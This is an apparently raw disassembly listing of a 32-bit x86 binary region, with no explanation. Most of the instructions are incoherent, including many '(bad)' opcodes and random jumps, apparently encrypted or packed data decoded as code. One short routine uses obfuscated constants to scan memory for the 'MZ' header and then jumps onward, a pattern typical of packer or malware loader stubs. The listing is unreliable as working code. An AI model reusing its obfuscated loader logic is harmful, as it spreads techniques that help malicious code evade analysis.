  40bfb0:	lods   eax,DWORD PTR ds:[esi]
  40bfb1:	into   
  40bfb2:	sbb    esp,DWORD PTR [edx]
  40bfb4:	push   ebp
  40bfb5:	sub    DWORD PTR [ebp+0x1b],edi
  40bfb8:	push   esi
  40bfb9:	sahf   
  40bfba:	sahf   
  40bfbb:	std    
  40bfbc:	js     0x40bff1
  40bfbe:	ret    
  40bfbf:	scas   eax,DWORD PTR es:[edi]
  40bfc0:	mov    esp,ss
  40bfc2:	jge    0x40bfc4
  40bfc4:	mov    al,0x5b
  40bfc6:	and    al,0x5
  40bfc8:	mov    ds:0x68e02879,al
  40bfcd:	loop   0x40bfdf
  40bfcf:	test   al,0x15
  40bfd1:	and    ah,ah
  40bfd3:	and    BYTE PTR [edx-0x52],bh
  40bfd6:	loop   0x40c048
  40bfd8:	xchg   ecx,eax
  40bfd9:	adc    al,0xfc
  40bfdb:	in     eax,dx
  40bfdc:	aas    
  40bfdd:	enter  0x5417,0xad
  40bfe1:	jl     0x40c040
  40bfe3:	inc    edx
  40bfe4:	or     eax,0xad0ecd14
  40bfe9:	repz jp 0x40c068
  40bfec:	mov    ds:0x517a4203,al
  40bff1:	pop    ebx
  40bff2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bff3:	nop
  40bff4:	in     eax,0xcf
  40bff6:	pop    esp
  40bff7:	pop    ss
  40bff8:	mov    esi,DWORD PTR [esi+0x56fabde3]
  40bffe:	sbb    ecx,esp
  40c000:	mov    esp,DWORD PTR [edx-0x45]
  40c003:	mov    ah,0xfc
  40c005:	jle    0x40bfe0
  40c007:	pushf  
  40c008:	lahf   
  40c009:	xchg   esp,eax
  40c00a:	mov    dh,0x50
  40c00c:	jbe    0x40c082
  40c00e:	mov    ds:0x2d2e52d8,al
  40c013:	adc    BYTE PTR [ecx-0x6e],0x3f
  40c017:	loop   0x40c00b
  40c019:	out    0x48,al
  40c01b:	xchg   esi,eax
  40c01c:	inc    BYTE PTR [esi+esi*4+0x7d053a43]
  40c023:	loope  0x40bfd6
  40c025:	jae    0x40bfbf
  40c027:	inc    eax
  40c028:	setae  BYTE PTR [edi+0xa]
  40c02c:	(bad)  
  40c02d:	outs   dx,DWORD PTR ds:[esi]
  40c02e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c02f:	outs   dx,DWORD PTR ds:[esi]
  40c030:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c031:	cli    
  40c032:	and    eax,0x5f43b668
  40c037:	sub    eax,0xc680cb58
  40c03c:	(bad)  
  40c03d:	mov    ah,0xdb
  40c03f:	adc    esi,ecx
  40c041:	fisubr WORD PTR [ecx+0x29c5af38]
  40c047:	xchg   DWORD PTR [ebx],esi
  40c049:	lods   al,BYTE PTR ds:[esi]
  40c04a:	add    al,0xf9
  40c04c:	mov    edx,0x6d340c5d
  40c051:	dec    ecx
  40c052:	dec    edx
  40c053:	push   ebp
  40c054:	mov    ebp,0x545810a9
  40c059:	into   
  40c05a:	dec    esi
  40c05b:	mov    al,0xe6
  40c05d:	or     BYTE PTR [ebx+0xd42d358],dl
  40c063:	ror    DWORD PTR [ecx-0x2bbaf570],1
  40c069:	xchg   edx,eax
  40c06a:	add    DWORD PTR [esi+0x9],0xffffffaf
  40c06e:	mov    BYTE PTR [ebp-0x9e04926],dh
  40c074:	std    
  40c075:	sbb    eax,0x81c6c6f2
  40c07a:	xor    DWORD PTR [eax+0x3669203f],ebp
  40c080:	add    DWORD PTR [ebx+0x45],0x218c8c72
  40c087:	xchg   ecx,eax
  40c088:	rcl    bh,1
  40c08a:	or     ebx,ebx
  40c08c:	mov    edi,0xdf0e022b
  40c091:	mov    ?,WORD PTR [ecx+ecx*4+0x4b634b2b]
  40c098:	lods   eax,DWORD PTR ds:[esi]
  40c099:	sbb    BYTE PTR [esi*2-0x2d282d39],ch
  40c0a0:	ficomp DWORD PTR ds:0xdc95d2c6
  40c0a6:	mov    edi,0x3e5f78e5
  40c0ab:	cmp    eax,0x888a844b
  40c0b0:	fst    QWORD PTR [eax-0x1f]
  40c0b3:	cmp    BYTE PTR [edx+0x19f5e1d8],bh
  40c0b9:	cmp    DWORD PTR [eax-0x3b4cf05c],ecx
  40c0bf:	push   cs
  40c0c0:	ror    DWORD PTR [ebx],1
  40c0c2:	jae    0x40c0ba
  40c0c4:	out    dx,al
  40c0c5:	jbe    0x40c0b0
  40c0c7:	cmp    BYTE PTR [edi+0x4b],0xa7
  40c0cb:	jbe    0x40c141
  40c0cd:	xchg   edi,eax
  40c0ce:	sbb    al,0xd1
  40c0d0:	jb     0x40c08b
  40c0d2:	pop    ebp
  40c0d3:	push   ss
  40c0d4:	inc    esi
  40c0d5:	mov    BYTE PTR [edi+eiz*1-0x24],bl
  40c0d9:	pop    edx
  40c0da:	mov    ebp,0x17e2fe43
  40c0df:	push   eax
  40c0e0:	mov    ds:0x50ae6de8,al
  40c0e5:	stos   DWORD PTR es:[edi],eax
  40c0e6:	inc    esi
  40c0e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0e8:	pop    ebx
  40c0e9:	cmp    DWORD PTR [edi+0x31],ebx
  40c0ec:	scas   eax,DWORD PTR es:[edi]
  40c0ed:	and    al,0xe1
  40c0ef:	cmp    bh,BYTE PTR [edx+edx*2]
  40c0f2:	add    BYTE PTR [edi],ah
  40c0f4:	xchg   edi,eax
  40c0f5:	xlat   BYTE PTR ds:[ebx]
  40c0f6:	xor    BYTE PTR ds:0x2786bc6,bl
  40c0fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0fd:	xchg   ecx,eax
  40c0fe:	shl    DWORD PTR [ebx],0x8c
  40c101:	mov    ebx,0x3e48a6a8
  40c106:	adc    eax,edi
  40c108:	gs in  al,dx
  40c10a:	inc    edi
  40c10b:	sub    BYTE PTR [ebp-0x51b7de21],0xae
  40c112:	xchg   ecx,eax
  40c113:	outs   dx,DWORD PTR ds:[esi]
  40c115:	xor    DWORD PTR [ebx-0x46],ebp
  40c118:	or     al,0x64
  40c11a:	ret    0xd497
  40c11d:	fldl2t 
  40c11f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c120:	pop    ebp
  40c121:	add    ebp,DWORD PTR [ebx-0x3]
  40c124:	mov    eax,ds:0x9b937b40
  40c129:	cmp    DWORD PTR [ebx],eax
  40c12b:	mov    cl,0xf2
  40c12d:	scas   eax,DWORD PTR es:[edi]
  40c12e:	add    BYTE PTR [ebp-0x733412b5],ah
  40c134:	add    bh,bl
  40c136:	xchg   esi,eax
  40c137:	mov    BYTE PTR [ebp-0x1aab8d14],ch
  40c13d:	mov    esp,0xd045098
  40c142:	cmp    DWORD PTR [esi-0x6b],eax
  40c145:	fistp  QWORD PTR [esi-0x417aa6ed]
  40c14b:	mov    al,0x62
  40c14d:	sti    
  40c14e:	or     DWORD PTR ds:0x86f59f8,ecx
  40c154:	popf   
  40c155:	loop   0x40c0e2
  40c157:	jne    0x40c18b
  40c159:	test   BYTE PTR [ecx-0x38],bh
  40c15c:	ret    
  40c15d:	test   eax,0xe9922285
  40c162:	xchg   BYTE PTR [edx],al
  40c164:	stc    
  40c165:	sbb    DWORD PTR [ebx+0x1d0ce8ec],0xffffff94
  40c16c:	xchg   ebp,eax
  40c16d:	test   BYTE PTR [edi],al
  40c16f:	(bad)  
  40c170:	shr    BYTE PTR [edx],1
  40c172:	sub    eax,0x5f8f081f
  40c177:	add    eax,0x67d3a1b7
  40c17c:	xor    DWORD PTR [edx+ebp*1+0x36340d23],0xffffff9c
  40c184:	stc    
  40c185:	adc    ebx,ebp
  40c187:	mov    eax,ds:0xd3a0549e
  40c18c:	adc    BYTE PTR [esp+ebp*4-0x21],bh
  40c190:	icebp  
  40c191:	adc    dl,ch
  40c193:	cmp    BYTE PTR [ebx-0x2a4e916c],dh
  40c199:	ins    DWORD PTR es:[edi],dx
  40c19a:	and    al,0xe7
  40c19c:	mov    fs,esi
  40c19e:	xchg   ebp,eax
  40c19f:	sti    
  40c1a0:	fld    DWORD PTR [ebx+ebx*1]
  40c1a3:	cli    
  40c1a4:	loopne 0x40c186
  40c1a6:	stc    
  40c1a7:	push   0x3b09b72
  40c1ac:	xor    ebp,ecx
  40c1ae:	cmp    BYTE PTR ds:0x192dcd5a,bh
  40c1b4:	sbb    edx,DWORD PTR [ebx-0x5b]
  40c1b7:	add    al,0x8
  40c1b9:	ja     0x40c16e
  40c1bb:	add    al,0xdd
  40c1bd:	pop    eax
  40c1be:	add    esi,DWORD PTR [ebx]
  40c1c0:	xchg   ebp,eax
  40c1c1:	pushf  
  40c1c2:	sub    al,0x6b
  40c1c4:	(bad)  
  40c1c5:	cld    
  40c1c6:	lods   al,BYTE PTR ds:[esi]
  40c1c7:	int3   
  40c1c8:	jno    0x40c22e
  40c1ca:	pcmpgtb mm1,mm2
  40c1cd:	mov    bh,0x89
  40c1cf:	(bad)  
  40c1d1:	and    DWORD PTR [ebx],edi
  40c1d3:	popf   
  40c1d4:	sbb    BYTE PTR [eax],dh
  40c1d6:	sbb    al,0x32
  40c1d8:	(bad)  
  40c1d9:	out    0x25,al
  40c1db:	or     eax,DWORD PTR [eax]
  40c1dd:	mov    ds:0xcce3c047,al
  40c1e2:	shl    DWORD PTR [ebx-0x4b43cc0],cl
  40c1e8:	outs   dx,BYTE PTR ds:[esi]
  40c1e9:	lahf   
  40c1ea:	call   0xf607621c
  40c1ef:	ins    DWORD PTR es:[edi],dx
  40c1f0:	xchg   BYTE PTR [edi+0x7f5d17f1],ch
  40c1f6:	cmp    eax,0x6a2f825e
  40c1fb:	inc    edi
  40c1fc:	mov    ch,0x1b
  40c1fe:	pushf  
  40c1ff:	pop    ebx
  40c200:	push   eax
  40c201:	jg     0x40c1b1
  40c203:	mov    ecx,0x34a8e557
  40c208:	inc    ebp
  40c209:	lods   al,BYTE PTR ds:[esi]
  40c20a:	dec    esp
  40c20b:	jmp    0xbb1f6a85
  40c210:	ret    0x19d3
  40c213:	push   ecx
  40c214:	jae    0x40c26a
  40c216:	inc    edi
  40c217:	pop    edi
  40c218:	mov    esp,0x43be4ee6
  40c21d:	pop    ss
  40c21e:	pop    edx
  40c21f:	inc    edx
  40c220:	aaa    
  40c221:	sub    al,0x89
  40c223:	(bad)  
  40c224:	mov    dh,0xb8
  40c226:	sti    
  40c227:	retf   0x3247
  40c22a:	xor    al,0x88
  40c22c:	and    ah,cl
  40c22e:	mov    dh,0xa1
  40c230:	not    DWORD PTR [edi+0x34b3ef93]
  40c236:	shl    DWORD PTR [ecx-0x1d580777],1
  40c23c:	ud1    esp,DWORD PTR [ebx]
  40c23f:	xor    ecx,esi
  40c241:	fnstcw WORD PTR [ebp-0x258da875]
  40c247:	inc    edi
  40c248:	test   eax,0x8587c8b3
  40c24d:	in     eax,dx
  40c24e:	rcl    DWORD PTR [esi+0x702993bb],0x7c
  40c255:	lea    ebx,ds:0x68676039
  40c25b:	fiadd  WORD PTR [ebx]
  40c25d:	hlt    
  40c25e:	push   es
  40c25f:	cmp    ecx,ecx
  40c261:	mov    bl,0x99
  40c263:	pop    edx
  40c264:	cmp    DWORD PTR [ebp+0x2],ecx
  40c267:	fs mov ebp,0xffa8d237
  40c26d:	cmc    
  40c26e:	lds    esp,FWORD PTR [eax-0x3b]
  40c271:	aaa    
  40c272:	xor    DWORD PTR [ecx-0x4d9cd89c],eax
  40c278:	sahf   
  40c279:	xor    eax,0xf0ec1b0f
  40c27e:	int    0x45
  40c280:	dec    esp
  40c281:	sub    edi,DWORD PTR [ebp+0xd]
  40c284:	inc    ebx
  40c285:	jnp    0x40c26b
  40c287:	repnz add BYTE PTR [eax],bl
  40c28a:	lods   al,BYTE PTR ds:[esi]
  40c28b:	adc    BYTE PTR [ecx],dl
  40c28d:	pop    eax
  40c28e:	push   ecx
  40c28f:	xor    eax,0xc318c9af
  40c294:	cmp    eax,0x52db3e14
  40c299:	push   cs
  40c29a:	cld    
  40c29b:	shl    DWORD PTR [edi+0x5f],cl
  40c29e:	addr16 adc eax,0x6b750524
  40c2a4:	cmp    edx,DWORD PTR [esi]
  40c2a6:	shl    BYTE PTR [ebx+ebx*8-0x3de9f953],1
  40c2ad:	cdq    
  40c2ae:	daa    
  40c2af:	(bad)  
  40c2b0:	mov    dh,0x76
  40c2b2:	pop    ecx
  40c2b3:	cli    
  40c2b4:	or     DWORD PTR [edi+eiz*2],ebx
  40c2b7:	and    edx,DWORD PTR [ecx]
  40c2b9:	sub    al,ah
  40c2bb:	mov    esp,0x638a410e
  40c2c0:	xor    esp,ecx
  40c2c2:	fidiv  DWORD PTR [ebp+eiz*1+0x485e9155]
  40c2c9:	out    dx,al
  40c2ca:	test   ebp,ecx
  40c2cc:	int    0xc2
  40c2ce:	int    0xba
  40c2d0:	pop    eax
  40c2d1:	call   0x3471d71f
  40c2d6:	loop   0x40c290
  40c2d8:	cmp    ebx,ebx
  40c2da:	(bad)  
  40c2db:	stc    
  40c2dc:	and    ah,al
  40c2de:	cwde   
  40c2df:	stc    
  40c2e0:	push   esp
  40c2e1:	inc    edx
  40c2e2:	test   DWORD PTR [ebx],edx
  40c2e4:	xor    al,0xf6
  40c2e6:	in     eax,dx
  40c2e7:	fcomp  DWORD PTR [esi+0x24]
  40c2ea:	popf   
  40c2eb:	push   ss
  40c2ec:	js     0x40c2cd
  40c2ee:	out    dx,al
  40c2ef:	adc    ah,BYTE PTR [edi-0x14fca6ef]
  40c2f5:	repz cwde 
  40c2f7:	mov    ecx,0x36941f40
  40c2fc:	push   esi
  40c2fd:	jno    0x40c370
  40c2ff:	push   ecx
  40c300:	das    
  40c301:	jne    0x40c29e
  40c303:	mov    ebp,0xf93ec776
  40c308:	mov    fs,WORD PTR es:[ebx-0x2b]
  40c30c:	mov    cl,BYTE PTR [eax+0x4adb47c0]
  40c312:	clc    
  40c313:	sar    DWORD PTR [edx],0x8d
  40c316:	arpl   WORD PTR [ecx-0x74],sp
  40c319:	xor    edx,DWORD PTR [ebx-0x58]
  40c31c:	xor    DWORD PTR [eax+0x50],esi
  40c31f:	adc    ah,0x29
  40c322:	lahf   
  40c323:	mov    edx,0xcc74469d
  40c328:	xor    eax,0xfae46698
  40c32d:	adc    cl,0xcb
  40c330:	dec    esi
  40c331:	aad    0xbf
  40c333:	test   al,0xd1
  40c335:	mov    BYTE PTR [esi+0x778fa617],al
  40c33b:	dec    esp
  40c33c:	ja     0x40c334
  40c33e:	pop    ebp
  40c33f:	nop
  40c340:	arpl   WORD PTR [esi+0x61],sp
  40c343:	or     ah,ah
  40c345:	idiv   DWORD PTR [edi-0x61dbbce7]
  40c34b:	ins    BYTE PTR es:[edi],dx
  40c34c:	pusha  
  40c34d:	scas   eax,DWORD PTR es:[edi]
  40c34e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c34f:	xchg   ebp,eax
  40c350:	jae    0x40c2ee
  40c352:	push   eax
  40c353:	loopne 0x40c356
  40c355:	sbb    BYTE PTR [ebx],bl
  40c357:	(bad)  
  40c359:	(bad)  
  40c35a:	loopne 0x40c343
  40c35c:	aaa    
  40c35d:	mov    BYTE PTR [ebx+0x5b],bl
  40c360:	cdq    
  40c361:	jl     0x40c312
  40c363:	mov    ebp,0x336a383a
  40c368:	xor    dl,BYTE PTR [ebx-0x5a]
  40c36b:	sbb    DWORD PTR [eax],edx
  40c36d:	cmp    cl,BYTE PTR [eax+0x24]
  40c370:	ror    DWORD PTR [ecx+0x5555e49],cl
  40c376:	xor    al,bh
  40c378:	dec    eax
  40c379:	xchg   ebx,eax
  40c37a:	mov    ds:0xfb5a88b6,eax
  40c37f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c380:	call   0xb07ef111
  40c385:	cmp    BYTE PTR [ebx],dh
  40c387:	ins    BYTE PTR es:[edi],dx
  40c388:	mov    eax,ds:0xd06dbd6d
  40c38d:	dec    ecx
  40c38e:	(bad)  
  40c38f:	cld    
  40c390:	cmp    ecx,edx
  40c392:	sub    eax,0x61e38330
  40c397:	sar    dh,1
  40c399:	pop    ebp
  40c39a:	call   0xe1ca:0x9ddf7639
  40c3a1:	lock ror bh,cl
  40c3a4:	les    ecx,FWORD PTR [ebx+edx*8+0x184af075]
  40c3ab:	rdtsc  
  40c3ad:	push   esi
  40c3ae:	add    eax,edi
  40c3b0:	sbb    DWORD PTR cs:[ecx+0x42a313cc],eax
  40c3b7:	ins    DWORD PTR es:[edi],dx
  40c3b8:	clc    
  40c3b9:	sbb    al,0xb4
  40c3bb:	jns    0x40c344
  40c3bd:	imul   ebp,DWORD PTR [edx+0x25a98258],0x2c70bc1e
  40c3c7:	adc    DWORD PTR [ebp-0x313967ad],ebp
  40c3cd:	cmp    DWORD PTR [ebp-0x23],edi
  40c3d0:	add    al,0x39
  40c3d2:	sbb    DWORD PTR [edi],eax
  40c3d4:	imul   ebx,eax,0x6c
  40c3d7:	pop    eax
  40c3d8:	in     al,0xa7
  40c3da:	fcom   st(6)
  40c3dc:	pop    eax
  40c3dd:	fld    QWORD PTR [esi-0x5d]
  40c3e0:	int3   
  40c3e1:	cdq    
  40c3e2:	leave  
  40c3e3:	dec    edi
  40c3e4:	dec    eax
  40c3e5:	fs mov cs,ebp
  40c3e8:	stos   DWORD PTR es:[edi],eax
  40c3e9:	xor    al,bh
  40c3eb:	stc    
  40c3ec:	test   ebx,edx
  40c3ee:	daa    
  40c3ef:	rcr    DWORD PTR [ecx-0x67],1
  40c3f2:	jle    0x40c460
  40c3f4:	mov    eax,DWORD PTR [edx+0x3da44164]
  40c3fa:	div    edx
  40c3fc:	xor    cl,BYTE PTR [ecx+0x7a0701e1]
  40c402:	dec    ebx
  40c403:	pop    ebp
  40c404:	inc    eax
  40c405:	jo     0x40c413
  40c407:	daa    
  40c408:	mov    al,BYTE PTR [ebx+0x43]
  40c40b:	(bad)  
  40c40c:	sub    ch,BYTE PTR [edi]
  40c40e:	leave  
  40c40f:	ja     0x40c3dc
  40c411:	int    0x3e
  40c413:	and    ah,BYTE PTR [ecx]
  40c415:	pop    es
  40c416:	sub    DWORD PTR [eax],esp
  40c418:	les    edx,FWORD PTR [ebx-0x5]
  40c41b:	scas   eax,DWORD PTR es:[edi]
  40c41c:	cld    
  40c41d:	push   edx
  40c41e:	ret    
  40c41f:	aas    
  40c420:	xchg   bl,ch
  40c422:	repnz push 0x4a3f3cdb
  40c428:	sub    edi,eax
  40c42a:	fwait
  40c42b:	push   esp
  40c42c:	imul   esp,DWORD PTR [ecx+0x1beb57db],0x32
  40c433:	inc    edi
  40c434:	cmp    cl,BYTE PTR [ebp+0x7f1f132c]
  40c43a:	cmp    cl,BYTE PTR fs:[ebx]
  40c43d:	aam    0xee
  40c43f:	mov    eax,0x4a36c0cc
  40c444:	or     eax,0xade65ce6
  40c449:	outs   dx,BYTE PTR ds:[esi]
  40c44a:	xor    BYTE PTR [eax],dh
  40c44c:	add    ebp,DWORD PTR [esi]
  40c44e:	stc    
  40c44f:	call   0xe221dacf
  40c454:	jge    0x40c464
  40c456:	mov    ds,edx
  40c458:	xor    ah,BYTE PTR [ebx+0x5a7e65f6]
  40c45e:	and    ebp,0x55
  40c461:	or     dl,BYTE PTR [edi]
  40c463:	push   eax
  40c464:	xor    ecx,0x14aab6a9
  40c46a:	ret    0x89c0
  40c46d:	push   ds
  40c46e:	sub    al,0x44
  40c470:	sbb    dh,dl
  40c472:	and    eax,0xb1074dc4
  40c477:	cmp    eax,0x378931ef
  40c47c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c47d:	lds    esi,FWORD PTR [ecx-0x53]
  40c480:	xor    al,0x3d
  40c482:	stos   DWORD PTR es:[edi],eax
  40c483:	mov    dl,0x9
  40c485:	sub    BYTE PTR [edi],ah
  40c487:	lahf   
  40c488:	stos   DWORD PTR es:[edi],eax
  40c489:	push   0x2739d1c1
  40c48e:	and    edx,DWORD PTR [ebp-0xb]
  40c491:	cmp    ecx,DWORD PTR [ebx+0x784f7daf]
  40c497:	dec    edx
  40c498:	pusha  
  40c499:	push   esp
  40c49a:	or     eax,DWORD PTR [ebx-0x77c73b62]
  40c4a0:	(bad)  
  40c4a1:	je     0x40c46b
  40c4a3:	lock jns 0x40c470
  40c4a6:	retf   
  40c4a7:	cdq    
  40c4a8:	cmc    
  40c4a9:	and    al,0x6b
  40c4ab:	push   0xa2a3fe46
  40c4b0:	mov    fs,WORD PTR [ecx+0x35]
  40c4b3:	pusha  
  40c4b4:	pop    edi
  40c4b5:	mov    eax,ds:0x4abfac1c
  40c4ba:	in     al,dx
  40c4bb:	ja     0x40c488
  40c4bd:	data16 ficomp DWORD PTR [ebx-0x27819cc2]
  40c4c4:	stos   DWORD PTR es:[edi],eax
  40c4c5:	inc    DWORD PTR cs:[eax+0x4069cf04]
  40c4cc:	call   0x752b288b
  40c4d1:	sbb    bh,ch
  40c4d3:	loope  0x40c521
  40c4d5:	dec    esi
  40c4d6:	out    dx,eax
  40c4d7:	and    dl,BYTE PTR [ecx-0x1f]
  40c4da:	pop    edi
  40c4db:	sub    DWORD PTR [edx+edi*1-0x3f70e3e3],ecx
  40c4e2:	imul   esp,DWORD PTR [ebx+edx*1+0x54],0x9f92182f
  40c4ea:	out    dx,eax
  40c4eb:	sub    BYTE PTR [esi-0x78],cl
  40c4ee:	or     DWORD PTR [edi-0x7e],ecx
  40c4f1:	fsub   st,st(2)
  40c4f3:	or     DWORD PTR [ebp+0x2e],eax
  40c4f6:	call   0x734d3718
  40c4fb:	add    ch,BYTE PTR [ebx]
  40c4fd:	and    dh,BYTE PTR [esi-0x19024858]
  40c503:	sub    DWORD PTR [esi],ebp
  40c505:	and    al,0x56
  40c507:	push   ebp
  40c508:	shr    dh,0xe0
  40c50b:	cmp    al,0xfd
  40c50d:	xchg   edx,eax
  40c50e:	pop    es
  40c50f:	adc    esi,DWORD PTR [esi-0x2a1f9045]
  40c515:	icebp  
  40c516:	pop    esi
  40c517:	fdivrp st(2),st
  40c519:	fild   DWORD PTR ds:0x3baf1c05
  40c51f:	push   ds
  40c520:	cmp    bl,BYTE PTR [eax+0x74ab2e3]
  40c526:	pop    esi
  40c527:	xor    al,0x96
  40c529:	in     al,0x82
  40c52b:	cdq    
  40c52c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c52d:	shr    BYTE PTR [edi+0x3bc4756e],cl
  40c533:	inc    edx
  40c534:	pop    ebp
  40c535:	and    eax,0x58d309ce
  40c53a:	xor    BYTE PTR [edx+0x29],cl
  40c53d:	xlat   BYTE PTR ds:[ebx]
  40c53e:	push   ecx
  40c53f:	jl     0x40c516
  40c541:	dec    ecx
  40c542:	jb     0x40c575
  40c544:	pop    es
  40c545:	sub    eax,0x453d9b61
  40c54a:	loop   0x40c5ca
  40c54c:	data16 gs sbb dl,cl
  40c550:	ja     0x40c579
  40c552:	fcom   st(1)
  40c554:	adc    edi,edi
  40c556:	out    0x9b,al
  40c558:	sub    esi,ebp
  40c55a:	repnz leave 
  40c55c:	aaa    
  40c55d:	dec    esi
  40c55e:	in     eax,0xb0
  40c560:	mov    ds:0x4549e2e4,al
  40c565:	xor    eax,0x4cdfbd24
  40c56a:	mov    ebp,0xaaaa1a8f
  40c56f:	jae    0x40c5da
  40c571:	hlt    
  40c572:	sbb    eax,0x21740933
  40c577:	pushf  
  40c578:	lods   al,BYTE PTR ds:[esi]
  40c579:	fwait
  40c57a:	(bad)  
  40c57b:	stos   DWORD PTR es:[edi],eax
  40c57c:	ret    
  40c57d:	shr    DWORD PTR [edi+0x74],1
  40c580:	push   es
  40c581:	mov    ebp,0xf5237e94
  40c586:	jl     0x40c55b
  40c588:	cmp    DWORD PTR [ecx],ecx
  40c58a:	je     0x40c5f3
  40c58c:	ja     0x40c592
  40c58e:	add    edi,DWORD PTR [eax]
  40c590:	mov    DWORD PTR [ebp-0x8],edi
  40c593:	mov    eax,DWORD PTR [ebp+0xc]
  40c596:	mov    edi,DWORD PTR [ebp+0xc]
  40c599:	xor    edi,ecx
  40c59b:	xor    eax,ecx
  40c59d:	lea    eax,[eax+edi*1+0x64e5c4]
  40c5a4:	mov    edi,DWORD PTR [ebp+0xc]
  40c5a7:	xor    edi,ecx
  40c5a9:	add    edi,edx
  40c5ab:	imul   eax,edi
  40c5ae:	mov    edi,DWORD PTR [ebp+0xc]
  40c5b1:	xor    edi,ecx
  40c5b3:	sub    edi,eax
  40c5b5:	mov    eax,DWORD PTR [ebp-0x4]
  40c5b8:	add    edi,edx
  40c5ba:	cmp    DWORD PTR [eax],edi
  40c5bc:	mov    eax,DWORD PTR [ebp-0x4]
  40c5bf:	mov    edi,DWORD PTR [ebp+0x10]
  40c5c2:	jg     0x40c5d5
  40c5c8:	xor    edi,ecx
  40c5ca:	mov    ebx,esi
  40c5cc:	sub    ebx,edi
  40c5ce:	add    DWORD PTR [eax],ebx
  40c5d0:	jmp    0x40c5db
  40c5d5:	xor    edi,ecx
  40c5d7:	add    edi,edx
  40c5d9:	add    DWORD PTR [eax],edi
  40c5db:	mov    eax,DWORD PTR [ebp-0x8]
  40c5de:	mov    edi,DWORD PTR [ebp-0x10]
  40c5e1:	mov    eax,DWORD PTR [eax]
  40c5e3:	xor    edi,ecx
  40c5e5:	add    edi,0x3272e1
  40c5eb:	not    edi
  40c5ed:	and    eax,edi
  40c5ef:	movsx  di,BYTE PTR [eax+0x1]
  40c5f4:	mov    ebx,0x3b51
  40c5f9:	sub    di,bx
  40c5fc:	mov    ebx,0x8a8d
  40c601:	xor    di,bx
  40c604:	mov    ebx,0x4f84
  40c609:	cmp    di,bx
  40c60c:	jne    0x40c634
  40c612:	movsx  di,BYTE PTR [eax]
  40c616:	mov    ebx,0x3b51
  40c61b:	sub    di,bx
  40c61e:	mov    ebx,0x8a8d
  40c623:	xor    di,bx
  40c626:	mov    ebx,0x4e71
  40c62b:	cmp    di,bx
  40c62e:	je     0x40c644
  40c634:	mov    edi,DWORD PTR [ebp-0x10]
  40c637:	xor    edi,ecx
  40c639:	mov    ebx,esi
  40c63b:	sub    ebx,edi
  40c63d:	add    eax,ebx
  40c63f:	jmp    0x40c5ef
  40c644:	mov    esi,DWORD PTR [ebp-0x14]
  40c647:	mov    esi,DWORD PTR [esi]
  40c649:	jmp    0x40e998
  40c64e:	dec    edi
  40c64f:	sub    edi,esi
  40c651:	pusha  
  40c652:	repz inc edx
  40c654:	or     esi,ebx
  40c656:	test   eax,0xba4b873c
  40c65b:	add    eax,0xe0a235a0
  40c660:	jl     0x40c6de
  40c662:	dec    esi
  40c663:	pop    edi
  40c664:	jl     0x40c6e2
  40c666:	and    al,ah
  40c668:	in     al,dx
  40c669:	(bad)  
  40c66b:	inc    esp
  40c66c:	pop    edx
  40c66d:	adc    al,0xe9
  40c66f:	dec    ebp
  40c670:	or     BYTE PTR [esi+0x1d9787df],al
  40c676:	ins    DWORD PTR es:[edi],dx
  40c677:	mov    ds:0x45d1d9e,al
  40c67c:	daa    
  40c67d:	call   0xec51:0x99a4a357
  40c684:	sbb    al,0x8c
  40c686:	adc    cl,al
  40c688:	fmul   st,st(1)
  40c68a:	mov    DWORD PTR [edx],edx
  40c68c:	cmp    bl,BYTE PTR [ecx]
  40c68e:	out    dx,eax
  40c68f:	sub    BYTE PTR [edi+0x219deb7c],ch
  40c695:	scas   al,BYTE PTR es:[edi]
  40c696:	push   eax
  40c697:	sbb    edi,DWORD PTR [edi]
  40c699:	fwait
  40c69a:	fs out dx,al
  40c69c:	jo     0x40c6f0
  40c69e:	add    DWORD PTR [edx-0x4d],esp
  40c6a1:	sbb    eax,0x39abd4ff
  40c6a6:	mov    al,ds:0x71857ffd
  40c6ab:	sbb    BYTE PTR ds:0xb24654a9,cl
  40c6b1:	test   al,0x2b
  40c6b3:	(bad)  
  40c6b4:	mov    esi,0xbea5c8f6
  40c6b9:	pop    esi
  40c6ba:	addr16 pop esp
  40c6bc:	popa   
  40c6bd:	fst    st(7)
  40c6bf:	mov    bh,0x74
  40c6c1:	push   ss
  40c6c2:	mov    ds:0xf6947bf8,eax
  40c6c7:	jg     0x40c723
  40c6c9:	sbb    al,0x8
  40c6cb:	xor    DWORD PTR [esi+eax*2+0x6cd4f7db],esi
  40c6d2:	sahf   
  40c6d3:	mov    ebx,0xc0fc3201
  40c6d8:	sub    ecx,0xb9a23db
  40c6de:	jns    0x40c66c
  40c6e0:	jl     0x40c720
  40c6e2:	aas    
  40c6e3:	and    eax,0xee8dc4ef
  40c6e8:	sub    BYTE PTR gs:[edx-0x6c],dh
  40c6ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6ed:	sbb    al,0xcb
  40c6ef:	ja     0x40c6dc
  40c6f1:	mov    cl,0x2e
  40c6f3:	mov    al,ds:0x7e8bb5ff
  40c6f8:	mov    esi,0xf5a215b5
  40c6fd:	mov    bl,0xec
  40c6ff:	inc    ebp
  40c700:	idiv   DWORD PTR [eax-0x1b]
  40c703:	push   esp
  40c704:	inc    esp
  40c705:	mov    WORD PTR [eax-0x58cedbe6],?
  40c70b:	push   ds
  40c70c:	dec    edx
  40c70d:	or     DWORD PTR [ebp+0x7500b4c2],ecx
  40c713:	sub    eax,0xe1f5ae84
  40c718:	mov    ss,WORD PTR [ebx+0x3fa2752b]
  40c71e:	imul   edi,DWORD PTR [edx+0x3475e4e],0x55ddd3bb
  40c728:	neg    DWORD PTR [ebp+0x16]
  40c72b:	aad    0xc7
  40c72d:	dec    eax
  40c72e:	test   ecx,esp
  40c730:	jg     0x40c6fd
  40c732:	idiv   BYTE PTR [ebx+0x7e9a2768]
  40c738:	cs xchg ecx,eax
  40c73a:	retf   0x7688
  40c73d:	pop    edx
  40c73e:	(bad)  
